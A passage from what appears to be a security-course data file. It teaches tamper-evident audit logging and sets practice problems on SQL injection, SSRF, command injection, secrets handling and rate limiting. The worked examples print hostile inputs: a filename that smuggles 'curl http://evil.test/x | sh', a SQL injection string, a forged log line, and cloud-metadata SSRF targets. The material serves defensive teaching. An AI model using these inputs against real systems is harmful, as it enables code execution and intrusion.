SENSITIVE = re.compile(r'(password|token|secret|authorization|card)', re.I)

def audit(actor, action, resource, result, **extra):
    clean = {}
    for k, v in extra.items():
        if SENSITIVE.search(k):
            clean[k] = '[REDACTED]'                                # never write secrets
        else:
            clean[k] = str(v).replace('\\n', ' ').replace('\\r', ' ')[:200]   # stop CR/LF forging, cap length
    rec = {'actor': actor, 'action': action, 'resource': resource, 'result': result, **clean}
    return json.dumps(rec, sort_keys=True)                         # structured JSON: one event, one line

print(audit('asha', 'LOGIN', 'session', 'ok', ip='203.0.113.9', password='hunter2'))
print(audit('mallory', 'LOGIN', 'session', 'denied', username='x\\n2026-01-01 admin LOGIN ok'))` }
  ],
  codeTitle: ['JS: hash-chained audit log', 'Java: chain + verify', 'Python: safe structured line'],
  viz: {
    title: 'Hash-chained audit log: where a tampered link breaks the chain',
    input: '1',
    inputLabel: 'Index (0-3) of the entry the attacker edits, or 9 for none',
    gen: function (input) {
      var t = parseInt(String(input).trim(), 10);
      if (isNaN(t) || t < 0 || (t > 3 && t !== 9)) throw new Error('Enter 0, 1, 2, 3 or 9 (no tampering)');
      function h(s) { var x = 5381; for (var i = 0; i < s.length; i++) x = ((x * 33) ^ s.charCodeAt(i)) >>> 0; return ('0000000' + x.toString(16)).slice(-8); }
      var acts = ['asha LOGIN ok', 'asha EXPORT customers', 'ben DELETE inv:205 denied', 'asha ROLE ben=admin'];
      var stored = [], prev = 'GENESIS', i;
      for (i = 0; i < acts.length; i++) { var hh = h(prev + '|' + acts[i]); stored.push({ act: acts[i], prev: prev, hash: hh }); prev = hh; }
      var shown = acts.slice(); if (t !== 9) shown[t] = 'nobody ' + acts[t].split(' ').slice(1).join(' ');
      var frames = [];
      frames.push({ narr: 'Four audit entries. Each stores the hash of the previous one, so they form a chain: hash(n) = H(hash(n-1) + entry n).', parts: [{ type: 'list', label: 'Chain (head at right)', values: stored.map(function (s) { return s.hash; }), next: [1, 2, 3, -1] }, tbl(['#', 'Entry', 'prevHash', 'hash'], stored.map(function (s, k) { return [k, s.act, s.prev, s.hash]; }), {})] });
      if (t === 9) {
        frames.push({ narr: 'Verification walks from the start recomputing every hash. Everything matches.', parts: [{ type: 'list', values: stored.map(function (s) { return s.hash; }), next: [1, 2, 3, -1], hl: { 0: 'ok', 1: 'ok', 2: 'ok', 3: 'ok' } }] });
        frames.push({ narr: 'No tampering: the chain is intact. Store the head hash <b>' + stored[3].hash + '</b> outside the attacker\'s reach to detect even a full rewrite.', parts: [{ type: 'vars', vals: { head: stored[3].hash, status: 'intact' }, hl: { status: 'ok' } }] });
        frames.push({ narr: 'Try an index 0 to 3 to see what an edit breaks.', parts: [{ type: 'text', html: 'Pass 0-3 as input.' }] });
        return frames;
      }
      frames.push({ narr: 'An attacker with write access edits entry <b>' + t + '</b> to hide who did it: "' + acts[t] + '" becomes "' + shown[t] + '".', parts: [{ type: 'list', values: stored.map(function (s) { return s.hash; }), next: [1, 2, 3, -1], hl: (function () { var o = {}; o[t] = 'cur'; return o; })() }] });
      var rec = [], prev2 = 'GENESIS', firstBad = -1, hlRows = {};
      for (i = 0; i < acts.length; i++) {
        var calc = h(prev2 + '|' + shown[i]);
        var bad = (stored[i].prev !== prev2) || calc !== stored[i].hash;
        rec.push([i, shown[i], stored[i].hash, calc, bad || firstBad >= 0 ? 'MISMATCH' : 'match']);
        if (bad && firstBad < 0) firstBad = i;
        hlRows[i] = firstBad >= 0 ? 'bad' : 'ok';
        prev2 = stored[i].hash;                      // verifier continues from the STORED hash to localise the first break
        var hl2 = {}; for (var q = 0; q < rec.length; q++) hl2[q] = hlRows[q];
        frames.push({ narr: 'Verify entry ' + i + ': recompute H(prev + entry) = <b>' + calc + '</b> vs stored <b>' + stored[i].hash + '</b>. ' + (bad && firstBad === i ? '<span class="c-r">MISMATCH - tampering detected here.</span>' : (firstBad >= 0 ? 'Later entries are suspect because they depend on this link.' : 'Match.')), parts: [{ type: 'list', values: stored.map(function (s) { return s.hash; }), next: [1, 2, 3, -1], hl: (function () { var o = {}; for (var z = 0; z <= i; z++) o[z] = hlRows[z]; return o; })() }, tbl(['#', 'Entry (as found)', 'Stored hash', 'Recomputed', 'Check'], rec.slice(), hl2)] });
      }
      frames.push({ narr: 'Result: first bad entry is <b>#' + firstBad + '</b>. An attacker cannot quietly change history; to hide it they would have to recompute all later hashes AND beat the externally stored head hash or signature.', parts: [{ type: 'vars', vals: { firstBadIndex: firstBad, action: 'alert security + preserve evidence' }, hl: { firstBadIndex: 'bad' } }] });
      return frames;
    }
  },
  examples: [
    { title: 'Design the audit event for "export customers"', html: `<p>Fields: <code>ts</code> (UTC), <code>actor</code> (user id + role), <code>action</code> = EXPORT, <code>resource</code> = customers (filter summary, row count, not the data), <code>result</code>, <code>ip</code>, <code>request_id</code>, <code>reason/ticket</code> for break-glass. Alert: export of more than 1,000 rows, or outside business hours, or by an account that never exported before.</p>` },
    { title: 'Log injection and its fix', html: `<p>Logging <code>"login failed for " + username</code> with username <code>bob\\n2026-10-15 admin LOGIN ok</code> forges a second line. Fix: structured JSON logging (the library escapes newlines), or strip CR/LF; also cap length. Never log raw user input into a format that tools parse by line.</p>` },
    { title: 'Where the log lives', html: `<p>Ship events immediately to a separate account/system with append-only permissions (write-only for the app), WORM retention (S3 Object Lock), and restricted deletion with dual control. Keep application servers unable to modify what they have already written. Time-sync everything (NTP) so events can be ordered.</p>` }
  ],
  deepDive: `<p>🟣 <b>Hash chain limits.</b> A bare chain proves consistency but not authenticity: someone with write access can rewrite the whole file and recompute every hash. Fix with (a) <b>HMAC</b> using a key the app cannot read at rest (key in KMS/HSM), (b) <b>periodic signed checkpoints</b> (sign the head every minute or N entries and publish it elsewhere), (c) a <b>Merkle tree</b> (as in Certificate Transparency) giving efficient inclusion and consistency proofs, or (d) a managed ledger service. Concurrency: serialise appends per chain (single writer or sequence allocation), or use one chain per tenant/shard and anchor the shard heads in a higher-level chain. Include a monotonically increasing sequence number to detect deletion at the tail, and a canonical encoding (fixed field order, no ambiguity) before hashing.</p>
  <p><b>Operational realities.</b> Retention: regulations define periods (PCI 1 year, HIPAA 6 years, SOX 7). Privacy: GDPR conflicts with immutability; log pseudonymous ids and use crypto-shredding (delete the key that decrypts the PII field). Volume and cost: sample debug logs but never audit logs. Reliability: audit writes for critical actions should be part of the transaction (outbox pattern) so an action never happens without a record - or fail the action. Monitoring: heartbeat alerts for log silence (attackers disable logging), integrity verifier running on a schedule, and incident-response playbooks. <b>Correlation:</b> propagate a trace/request id through all services so one user action is traceable across 20 microservices. <b>MITRE ATT&amp;CK</b> mappings help write detections (valid accounts, credential access, exfiltration).</p>`,
  aiEra: `<p>🤖 <b>What AI changes:</b> Two new things to audit: <b>prompts and tool calls of AI agents</b> (which agent, on whose behalf, which tool, which arguments, what result, who approved) - without that, "the AI did it" is not an acceptable answer to an auditor - and <b>model outputs used in decisions</b>. Be careful: prompts and responses often contain personal data and secrets, so redact before storing. On the defence side, AI helps triage: summarising thousands of alerts, spotting anomalies and writing detection queries, but its summary must link back to raw events. Attackers use AI to blend into normal-looking behaviour, so rely on strong, tamper-evident source records. <b>Where AI goes wrong:</b> logs the whole request including tokens "to help debugging", or silences "noisy" audit events. <b>You still own:</b> the event schema, retention, integrity design, and the alert rules that decide when a human wakes up.</p>`,
  problems: [
    P('Design Tamper-Evident Audit Logging for Admin Actions', 'Hard', ['audit logging', 'hash chain', 'design'],
      `<p>An admin console can change roles, refund payments and export data. Auditors require that admins cannot alter their own audit trail, even a database admin. Design the audit system: event schema, write path, integrity mechanism, storage, verification and alerting.</p>`,
      `10K admin events/day (bursts of 100/s); 7-year retention; GDPR applies; must survive app-server compromise.`,
      `<p>Entry 1 edited -> verification reports ${H.c('r', 'first bad index = 1')}; deleting the last entries -> ${H.c('r', 'head hash no longer matches external anchor')}.</p>`,
      `<p>Write audit rows to the same application database table with an UPDATE-able schema. A DB admin or an attacker who owns the app can edit or delete rows and nobody can tell.</p>`,
      { q: 'What defeats an attacker who rewrites the whole chain?', options: ['A longer hash', 'Anchoring the head hash/signature outside their control', 'Compressing the log', 'Sorting by timestamp'], answer: 1, explain: 'A chain alone can be recomputed; an external anchor, HMAC key or signature they cannot reach cannot be forged.' },
      [`<p>Hint 1: separate who can write from who can modify; the app should only append.</p>`, `<p>Hint 2: chain each event to the previous hash, then sign or anchor the head periodically in another trust domain.</p>`, `<p>Hint 3: think about deletion at the tail, concurrency, GDPR, and a verifier job with alerts.</p>`],
      `<p>Schema: JSON event with event_id, seq, ts (UTC), actor (id, role, session, MFA level), action, resource, before/after summary (ids and changed field names, not raw PII), result, source ip/user agent, request/trace id, approver for dual-control actions. Write path: the app emits events through a small audit service (or outbox in the same transaction as the business change) to a message log; the audit service is the single writer, assigns seq, computes hash = SHA-256(prevHash + canonical event) and appends to storage. Integrity: chain per shard; every minute sign the head (seq + hash + time) with a key held in KMS/HSM that only the audit service can use, and publish the signed checkpoint to a separate cloud account with WORM retention (S3 Object Lock in compliance mode) and optionally a public or third-party transparency log. Storage: append-only table with no UPDATE/DELETE grants, mirrored to WORM object storage; DB admins lack access to the signing key, so edits are detectable. Verification: a scheduled verifier in the separate account recomputes chains and compares with checkpoints, checking seq continuity and the last checkpoint so tail truncation is caught; verification failure pages security. GDPR: store PII encrypted per data subject with their own key and delete the key on erasure request (crypto-shredding), hash chain remains valid. Detection: SIEM alerts for role changes, exports above thresholds, off-hours admin activity, self-approval, log silence heartbeat missing, and any denied burst. Retention 7 years with lifecycle tiering; quarterly restore and verification drills.</p>`,
      `<p>Append O(1) with one hash; verification O(n) but incremental from the last checkpoint.</p>`, ['How do you scale to 100K events/s?', 'How would a Merkle tree improve verification and proofs for auditors?'])
  ]
});

/* =========================================================
   PRACTICE (14 problems: 4 Easy, 6 Medium, 4 Hard)
   ========================================================= */
practice.push(P('Fix the SQL Injection in a Login Query', 'Easy', ['sql injection', 'jdbc'],
  `<p>A login method builds <code>"SELECT id FROM users WHERE email='" + email + "'"</code> and compares the password in Java. Show the attack, rewrite the lookup safely, and say how the password should be checked.</p>`,
  `Java 21, JDBC, PostgreSQL.`,
  `<p>Attack email <code>' OR '1'='1</code> ${H.c('r', 'matches the first user')}. With <code>?</code> it matches nobody.</p>`,
  `<p>Removing single quotes from the input with replace(). Attackers use other syntax (numbers, comments, encodings) and real names like O'Brien break.</p>`,
  { q: 'What stops SQL injection at the root?', options: ['Escaping quotes manually', 'Parameterized queries', 'Hiding error messages', 'A longer password'], answer: 1, explain: 'Parameters keep user data out of the SQL syntax entirely.' },
  [`<p>Hint 1: the problem is that data and SQL share one string.</p>`, `<p>Hint 2: use PreparedStatement with a ? placeholder and setString.</p>`, `<p>Hint 3: fetch the stored hash by email, then verify with Argon2/bcrypt in code with a constant-time compare.</p>`],
  `<p>Replace the concatenated string with a constant statement: <code>SELECT id, pw_hash FROM users WHERE email = ?</code>, prepared with <code>conn.prepareStatement</code> and <code>ps.setString(1, email)</code>. The database now treats the whole input as one value, so the quote trick does nothing. Then verify the password in application code using a slow salted hash (Argon2id or bcrypt) and a constant-time comparison; never put the password in the WHERE clause and never store it in plain text. Return the same generic message for unknown email and wrong password, throttle attempts per account, and use a database user that can only SELECT from this table. Add a unit test with hostile inputs (quote, comment marker, UNION) expecting no match.</p>`,
  `<p>Same cost as the vulnerable query; prepared statements can be cached.</p>`, ['What if the table name is user-controlled?'],
  { lang: 'java', code: `import java.sql.*;\npublic class Login {\n    static Long findUserId(Connection c, String email) throws SQLException {\n        try (PreparedStatement ps = c.prepareStatement("SELECT id FROM users WHERE email = ?")) {\n            ps.setString(1, email);                 // bound as data\n            try (ResultSet rs = ps.executeQuery()) { return rs.next() ? rs.getLong(1) : null; }\n        }\n    }\n    public static void main(String[] a) { System.out.println("compiled"); }\n}` }));

practice.push(P('Spot the Secret in the Repository', 'Easy', ['secrets', 'git'],
  `<p>A code review shows <code>String apiKey = "..."</code> hard-coded in a constructor, and a <code>.env</code> file committed. List what is wrong, how to fix the code, and what to do about the values already in git history.</p>`,
  `Public company repo; keys grant read/write to a payment provider.`,
  `<p>${H.c('r', 'apiKey literal in source')} to ${H.c('g', 'System.getenv / vault lookup, fail fast if missing')}.</p>`,
  `<p>Move the key into a constant at the top of the file or into a config file that is committed. It is still in git and still readable by everyone with repo access.</p>`,
  { q: 'After a secret is pushed to a shared repo, what is the essential step?', options: ['Delete the file', 'Rotate the secret', 'Add it to .gitignore', 'Squash commits'], answer: 1, explain: 'Git history and clones keep the value; only revoking makes it useless.' },
  [`<p>Hint 1: git remembers everything, including deleted files.</p>`, `<p>Hint 2: the key must come from outside the code at runtime.</p>`, `<p>Hint 3: rotate, then prevent: .gitignore, pre-commit scanner, secret scanning push protection.</p>`],
  `<p>Problems: a secret in source and in a committed .env travels with every clone, fork, CI log and backup, and cannot be revoked per person. Fix: read the value from the environment or a secrets manager at startup (<code>System.getenv("PAYMENT_API_KEY")</code>) and fail fast with a clear error if it is missing, never printing the value. Commit only a <code>.env.example</code> with placeholder names, add <code>.env</code> to .gitignore, and inject real values through the deployment platform (Kubernetes secret mounted from a vault, CI secret store). For the exposed key: rotate it immediately at the provider (new key, deploy, disable old), check provider logs for misuse, then optionally rewrite history with git filter-repo for hygiene, understanding that forks and caches may keep copies. Prevent: pre-commit hook with gitleaks, push protection on the server, least-privilege separate keys per environment.</p>`,
  `<p>Process question; no complexity.</p>`, ['How would you handle a key embedded in a mobile app?'],
  { lang: 'java', code: `public class Cfg {\n    static String need(String name) {\n        String v = System.getenv(name);\n        if (v == null || v.isEmpty()) throw new IllegalStateException("missing env var " + name);\n        return v;\n    }\n    public static void main(String[] a) {\n        try { need("PAYMENT_API_KEY"); } catch (IllegalStateException e) { System.out.println(e.getMessage()); }\n    }\n}` }));

practice.push(P('Build an Allow-List Validator', 'Easy', ['input validation', 'allow-list'],
  `<p>Write a validator for a signup request with fields username (3-20 lowercase letters, digits, underscore, starting with a letter), age (13-120 integer) and plan (free, pro, team). It must reject unknown fields and return a list of errors.</p>`,
  `Pure function, no libraries; input is a parsed JSON object.`,
  `<p>${H.c('g', '{username:"asha_k", age:30, plan:"pro"} ok')} / ${H.c('r', '{username:"x;drop", age:"30", isAdmin:true} rejected')}.</p>`,
  `<p>A block-list that removes characters such as quotes and semicolons. It misses cases, silently changes data, and still accepts wrong types.</p>`,
  { q: 'Why reject unknown fields?', options: ['They are slower', 'They can enable mass assignment', 'JSON forbids them', 'They break regexes'], answer: 1, explain: 'Extra fields like isAdmin may be bound to internal properties if not rejected.' },
  [`<p>Hint 1: define what is allowed per field (type, pattern, range, enum).</p>`, `<p>Hint 2: iterate over the input keys to find unknown ones, then over the rules for missing and invalid ones.</p>`, `<p>Hint 3: return errors without echoing dangerous input back, and never "fix" input silently.</p>`],
  `<p>Describe rules as data: username -> regex <code>^[a-z][a-z0-9_]{2,19}$</code>; age -> integer in 13..120 checked with Number.isInteger (so the string "30" fails); plan -> enum. First loop over input keys and flag any key not in rules. Then loop over rules: missing -> error, wrong type or out of range -> error, else copy to a clean output object. Return {ok, errors, clean} and use only the clean object afterwards, so unvalidated data never travels further. Validation is syntactic; keep business checks (is the username taken?) and output encoding as separate layers, and keep parameterized queries for the database. Test with edge cases: empty string, very long string, unicode lookalikes, null, arrays, negative numbers, and prototype-pollution keys like __proto__.</p>`,
  `<p>O(number of fields) and linear-time regexes; cap string length before regex.</p>`, ['How do you prevent ReDoS in the regex?'],
  { lang: 'js', code: `const rules = { username: v => typeof v === 'string' && /^[a-z][a-z0-9_]{2,19}$/.test(v), age: v => Number.isInteger(v) && v >= 13 && v <= 120, plan: v => ['free', 'pro', 'team'].includes(v) };\nfunction validate(o) {\n  const errors = [];\n  for (const k of Object.keys(o)) if (!(k in rules)) errors.push('unknown field ' + k);\n  for (const k of Object.keys(rules)) if (!(k in o) || !rules[k](o[k])) errors.push('invalid ' + k);\n  return { ok: !errors.length, errors };\n}\nconsole.log(validate({ username: 'asha_k', age: 30, plan: 'pro' }));\nconsole.log(validate({ username: 'x;drop', age: '30', plan: 'pro', isAdmin: true }));` }));

practice.push(P('403 or 404? Hardening Error Responses', 'Easy', ['access control', 'information leak'],
  `<p>A user requests <code>/api/documents/88</code>. Document 88 exists but belongs to someone else. What status do you return, and how do you make sure error messages and timing do not reveal that the document exists?</p>`,
  `REST API with sequential ids.`,
  `<p>${H.c('r', '403 "not your document"')} confirms existence; ${H.c('g', '404 "not found"')} is identical to a missing id.</p>`,
  `<p>Return 403 with a message naming the owner. It teaches the attacker which ids are valid and who owns them.</p>`,
  { q: 'Why prefer 404 for objects the caller cannot access?', options: ['It is faster', 'It avoids confirming the object exists', 'It is required by HTTP', 'It makes caching easier'], answer: 1, explain: 'Same response for missing and forbidden stops enumeration of valid ids.' },
  [`<p>Hint 1: what does the attacker learn from different answers?</p>`, `<p>Hint 2: use the same status and body for both cases.</p>`, `<p>Hint 3: also keep response time and headers the same, and log the real reason internally.</p>`],
  `<p>Return 404 with the same generic body for both "does not exist" and "exists but not yours", for read, update and delete. Use a scoped query (<code>WHERE id = ? AND owner_id = ?</code>) so the code path is identical and cannot accidentally differ. Keep timing similar (do not do extra work only for existing rows) and avoid distinguishing headers or error codes. Log the true reason (denied access to doc 88 by user 7) in the audit log with the request id, and alert when one session produces many denials, which indicates enumeration. Use 403 only where existence is public information, for example a page the user can already see but may not edit. Combine with rate limiting and non-sequential ids as extra layers.</p>`,
  `<p>No extra complexity.</p>`, ['When is 403 the better answer?'], null));

practice.push(P('Block SSRF with a Resolve-and-Check Guard', 'Medium', ['ssrf', 'networking'],
  `<p>Write the algorithm for a function <code>isSafeToFetch(url)</code> for a service that downloads user-supplied URLs. Include redirects, IPv6, and DNS. Then list the infrastructure controls that back it up.</p>`,
  `Cloud VM with metadata service at 169.254.169.254; HTTP client follows redirects by default.`,
  `<p>${H.c('r', 'http://169.254.169.254/ blocked')}, ${H.c('r', 'http://2130706433 blocked')}, ${H.c('g', 'https://example.com ok')}.</p>`,
  `<p>Check whether the URL string contains "localhost" or "169.254". Decimal, hex, IPv6, DNS names and redirects bypass it.</p>`,
  { q: 'What must be checked, not the hostname text?', options: ['The resolved IP address', 'The URL length', 'The file extension', 'The user agent'], answer: 0, explain: 'The connection goes to an IP; any hostname can resolve to an internal one.' },
  [`<p>Hint 1: the HTTP client connects to an IP, so check the IP.</p>`, `<p>Hint 2: resolve all addresses, reject blocked ranges, and connect to the checked address.</p>`, `<p>Hint 3: handle each redirect hop yourself, and add IMDSv2 plus egress firewall.</p>`],
  `<p>Algorithm: (1) parse with a standard URL parser; allow only http/https, ports 80 and 443, no userinfo. (2) Resolve the host to all A and AAAA records. (3) For each IP, unwrap IPv4-mapped IPv6 and reject if it is loopback, private (10/8, 172.16/12, 192.168/16), link-local (169.254/16, fe80::/10), unique-local (fc00::/7), multicast, unspecified or carrier-grade NAT (100.64/10). (4) Open the connection to that validated IP with the original Host header and SNI, so a second DNS lookup cannot change it (anti-rebinding). (5) Disable automatic redirects; for each Location header repeat steps 1-4 up to a small limit. (6) Enforce timeouts and max response size. Backing controls: IMDSv2 required with hop limit 1, no instance role on the fetcher, a dedicated subnet whose egress firewall blocks private ranges, and a proxy allow-list for known partners. Log and alert on blocked attempts, since they signal probing.</p>`,
  `<p>One DNS resolution and a handful of range checks per request, O(1).</p>`, ['How does a DNS rebinding attack defeat naive checks?'], null));

practice.push(P('Fix a Command Injection in a File Converter', 'Medium', ['command injection', 'upload'],
  `<p>A service runs <code>Runtime.getRuntime().exec("convert " + uploadedName + " out.png")</code>. Explain the exploit and redesign it safely.</p>`,
  `Users upload images; the converter is an external CLI; Linux containers.`,
  `<p>Filename <code>a.jpg; curl http://evil.test/x | sh</code> ${H.c('r', 'runs attacker code')}. After fix: filename is a random UUID, arguments are separate, no shell.</p>`,
  `<p>Strip semicolons from the filename. Attackers use backticks, $(), newlines, &amp;&amp;, or a leading dash to inject options.</p>`,
  { q: 'Best structural fix?', options: ['Escape special characters', 'Avoid the shell: pass an argument array and generate the filename yourself', 'Run as root for permissions', 'Limit file size only'], answer: 1, explain: 'Without a shell and with a generated name, user text never becomes command syntax.' },
  [`<p>Hint 1: a shell parses the string, and the user controls part of it.</p>`, `<p>Hint 2: ProcessBuilder with separate arguments, no shell, generated safe file names.</p>`, `<p>Hint 3: add sandboxing: low-privilege user, no network, CPU/memory/time limits, read-only filesystem.</p>`],
  `<p>Root cause: string concatenation into a command line parsed by a shell. Redesign: (1) never use the original filename; save the upload under a random UUID in a private temp directory and keep the user's name only as metadata. (2) Call the tool with <code>new ProcessBuilder("convert", "--", inPath, outPath)</code>: each argument is delivered as is, no shell expands it, and <code>--</code> blocks option injection. (3) Validate the type by magic bytes and allow-list formats. (4) Prefer a library (ImageIO, libvips binding) over a CLI. (5) Contain the process: dedicated container with a non-root user, read-only root filesystem, no network, seccomp profile, CPU/memory/time limits and temp dir cleanup, because image tools have many vulnerabilities of their own (ImageMagick policy). (6) Return generic errors and log details internally. Test with hostile names including newlines, backticks, $(id), and a leading dash.</p>`,
  `<p>Not algorithmic; sandboxing adds startup cost per job.</p>`, ['What about archive uploads and zip-slip?'], null));

practice.push(P('Design Password Reset Without Account Enumeration', 'Medium', ['authentication', 'design'],
  `<p>Design a secure "forgot password" flow. Cover the token, expiry, responses, rate limiting, and what happens to existing sessions after the reset.</p>`,
  `Email-based reset; 2M users; attackers try to enumerate emails and hijack accounts.`,
  `<p>Both known and unknown emails get ${H.c('g', '"If the account exists, we sent an email"')}. Token is single-use and expires in 15 minutes.</p>`,
  `<p>Reply "no such user" for unknown emails, send a 4-digit code, never expire it, and keep sessions alive after reset.</p>`,
  { q: 'How should the reset token be stored?', options: ['Plain text in the DB', 'As a hash, like a password', 'In the URL only', 'In a cookie'], answer: 1, explain: 'If the DB leaks, stored plain tokens can be used to take over accounts; a hash cannot.' },
  [`<p>Hint 1: the response must be identical whether the email exists or not (including timing).</p>`, `<p>Hint 2: random 128-bit token from a CSPRNG, store only its hash, single use, short expiry.</p>`, `<p>Hint 3: rate limit by IP, by account and by email address; on success invalidate all sessions and notify the user.</p>`],
  `<p>Request step: accept the email, always respond with the same message and similar timing (do the work asynchronously through a queue). If the account exists generate 32 random bytes with a CSPRNG, store SHA-256(token) with the user id and an expiry of 15 minutes, delete older tokens, and email a link with the raw token. Confirm step: look up by hash with a constant-time comparison, check expiry and unused state, require a new password that passes strength and breached-list checks, hash it with Argon2id, mark the token used, and invalidate all sessions and refresh tokens. Send a "your password was changed" email to the old address. Protections: rate limits per IP and per account (for example 5 requests per hour), CAPTCHA after repeated use, do not put tokens in referrer-leaking pages (use POST after the first landing, referrer-policy no-referrer), require MFA if enabled rather than letting reset bypass it, log all steps in the audit trail. Do not use security questions.</p>`,
  `<p>O(1) per request; the main cost is the email queue.</p>`, ['How do you stop attackers from locking a victim out with repeated resets?'], null));

practice.push(P('Detect Which Services Use a Vulnerable Library', 'Medium', ['sbom', 'supply chain'],
  `<p>Write the process and the data you need so that within 15 minutes of a CVE announcement you can list every deployed service and image that contains the affected library, including transitive use.</p>`,
  `80 repositories, three languages, images deployed to Kubernetes.`,
  `<p>Query: <code>component = xml-util AND version &lt; 3.1.0</code> returns ${H.c('r', 'billing-api, report-worker')}.</p>`,
  `<p>Search the source code for the library name with grep. It misses transitive dependencies, base-image packages and vendored copies.</p>`,
  { q: 'What artifact records transitive components?', options: ['README', 'SBOM', 'Dockerfile comments', 'Git blame'], answer: 1, explain: 'An SBOM lists every component in a built artifact, including transitive ones.' },
  [`<p>Hint 1: scan what is built and deployed, not what is declared.</p>`, `<p>Hint 2: generate SBOMs in CI per build and store them keyed by image digest.</p>`, `<p>Hint 3: also keep a runtime inventory so you know which digests are running.</p>`],
  `<p>Build time: in CI, generate a CycloneDX SBOM for each artifact with Syft or the build tool plugin, attach it to the image as an attestation signed with cosign, and push a copy to an index (a database or a dependency-tracking platform such as Dependency-Track). The index stores component name, version, purl, image digest, repo, team and release time. Runtime: a Kubernetes inventory job lists running image digests per namespace, joined with the SBOM index. When an advisory arrives, run a query on component and version range, join with runtime inventory to show what is deployed now, tag each by exposure (internet-facing, handles untrusted input) and owner, and open tickets automatically. Also scan base images and OS packages, and keep a nightly rescan because advisories appear after builds. Measure time to inventory and time to patch. Vendored or statically linked copies need binary scanning (Syft on the image, Trivy filesystem scan), which is why scanning built artifacts beats scanning manifests.</p>`,
  `<p>Index lookup is O(log n); the investment is making SBOM generation automatic.</p>`, ['How do you handle a vulnerability with no available patch?'], null));

practice.push(P('Rate Limit a Public Search API with Burst Support', 'Medium', ['rate limiting'],
  `<p>Your search API averages 10 requests/second per client but clients legitimately burst to 50 requests when a page loads. Choose the algorithm and parameters, and describe the response when the limit is exceeded.</p>`,
  `Per-API-key limits; multiple servers; sub-millisecond overhead desired.`,
  `<p>Token bucket: capacity 50, refill 10/s. A burst of 50 passes, request 51 gets ${H.c('r', '429 Retry-After: 1')}.</p>`,
  `<p>Fixed window of 10 per second would reject the legitimate page-load burst, while a window of 600 per minute allows a 600-request spike at the minute boundary.</p>`,
  { q: 'Which algorithm allows bursts but caps the long-term rate?', options: ['Fixed window', 'Token bucket', 'Random drop', 'Round robin'], answer: 1, explain: 'Bucket capacity sets the burst; refill rate sets the average.' },
  [`<p>Hint 1: separate burst size from sustained rate.</p>`, `<p>Hint 2: token bucket with capacity 50 and refill 10 per second per key.</p>`, `<p>Hint 3: store tokens and last-refill time in Redis, updated atomically in a Lua script.</p>`],
  `<p>Use a token bucket: capacity 50 (burst), refill rate 10 tokens per second (sustained). Per request compute <code>tokens = min(capacity, tokens + elapsed * rate)</code>, then if tokens is at least 1 subtract one and allow; otherwise reject with 429, a Retry-After equal to (1 - tokens) / rate seconds rounded up, and RateLimit headers so clients can self-throttle. With several servers, store {tokens, timestamp} per key in Redis and run the update in one Lua script using the Redis clock, which makes it atomic and immune to server clock skew. Use a short TTL so idle keys expire. Layer a coarse IP-based limit for unauthenticated traffic and a global load-shedding limit to protect the backend. Define failure mode: if Redis is unreachable, fall back to a local per-process bucket at a reduced rate (fail-open with protection). Add per-endpoint cost (expensive queries cost 5 tokens) so cheap and costly calls are weighted fairly. Monitor 429 rates per client and alert on sustained abuse.</p>`,
  `<p>O(1) time and memory per key; one Redis call per request.</p>`, ['How do you weight requests by cost?'], null));

practice.push(P('Zero-Trust Review of a Flat Internal Network', 'Medium', ['zero trust', 'network'],
  `<p>All 30 services in a cluster can call each other freely over HTTP; a pod was compromised through a library bug. List the controls you add to limit lateral movement, in priority order.</p>`,
  `Kubernetes, one shared namespace, service accounts with cluster-admin.`,
  `<p>Before: compromised pod reaches database and metadata. After: ${H.c('g', 'NetworkPolicy deny, mTLS identity, scoped service account')} blocks it.</p>`,
  `<p>Add a firewall at the edge only. The attacker is already inside, so the edge changes nothing.</p>`,
  { q: 'Which control most directly limits lateral movement?', options: ['Bigger servers', 'Default-deny network policy plus per-service identity', 'More logging only', 'Longer passwords'], answer: 1, explain: 'Segmentation and identity-based authorization stop a compromised pod reaching other services.' },
  [`<p>Hint 1: assume breach - what can the attacker do from inside the pod?</p>`, `<p>Hint 2: cut network paths, cut permissions, cut credentials.</p>`, `<p>Hint 3: order by effort versus impact; start with the cluster-admin service accounts.</p>`],
  `<p>Priority order: (1) Remove cluster-admin from workload service accounts; give each service its own account with only the verbs it needs, and disable automounting the token where not needed. (2) Block the cloud metadata endpoint from pods (IMDSv2, hop limit 1, or network policy) so credentials cannot be stolen. (3) Default-deny NetworkPolicies per namespace, then explicit allow rules for each real call path, including egress. (4) Split services into namespaces by trust level. (5) Mesh mTLS with STRICT mode and AuthorizationPolicies by service identity, so even reachable services reject unknown callers. (6) Pod security: non-root, read-only filesystem, dropped capabilities, seccomp, no privileged pods, enforced by admission policy. (7) Secrets from a vault with short-lived dynamic credentials per service. (8) Detection: runtime security (Falco), audit logs of denied connections, alerts on new egress destinations. (9) Patch pipeline for the library bug that started it. Roll out gradually using observe-only modes, measuring traffic first, then enforcing.</p>`,
  `<p>Operational effort is in mapping real call paths; policy evaluation cost is negligible.</p>`, ['How do you map the real call graph before enforcing?'], null));

practice.push(P('Implement a Sliding-Window Limiter and Test It', 'Medium', ['rate limiting', 'code'],
  `<p>Implement a sliding-window rate limiter (N requests per W milliseconds per key) and describe the tests that prove it works at the boundary.</p>`,
  `In-memory first; assume a fake clock for tests.`,
  `<p>Limit 3 per 1000 ms: times 0,100,200 allowed; 300 ${H.c('r', 'rejected')}; 1000 allowed (0 expired).</p>`,
  `<p>Fixed counters reset each second, allowing double the limit around the boundary.</p>`,
  { q: 'When does a timestamp stop counting?', options: ['When t - ts >= W', 'Never', 'After N requests', 'At midnight'], answer: 0, explain: 'A request at time t counts only timestamps newer than t minus the window.' },
  [`<p>Hint 1: keep accepted timestamps per key in a queue.</p>`, `<p>Hint 2: drop timestamps older than now - window before counting.</p>`, `<p>Hint 3: compute Retry-After from the oldest timestamp; inject the clock for tests.</p>`],
  `<p>Store a deque of accepted timestamps per key. On each request with time t: pop from the front while front <= t - W; if the size is below N push t and allow, else reject and report retryAfter = front + W - t. Do not record rejected requests, or an attacker can keep themselves blocked forever and inflate memory. Inject a clock function so tests are deterministic. Tests: exactly N requests at the same millisecond pass and N+1 fails; a request at exactly front + W is allowed (expiry boundary); two keys do not interfere; Retry-After is correct; after a long gap everything resets; memory is bounded because old entries are pruned (also evict idle keys). For concurrency use a lock per key or an atomic store (Redis sorted set with ZREMRANGEBYSCORE, ZCARD, ZADD in a Lua script).</p>`,
  `<p>Amortized O(1) per request, O(N) memory per key.</p>`, ['How would the sliding window counter approximation save memory?'],
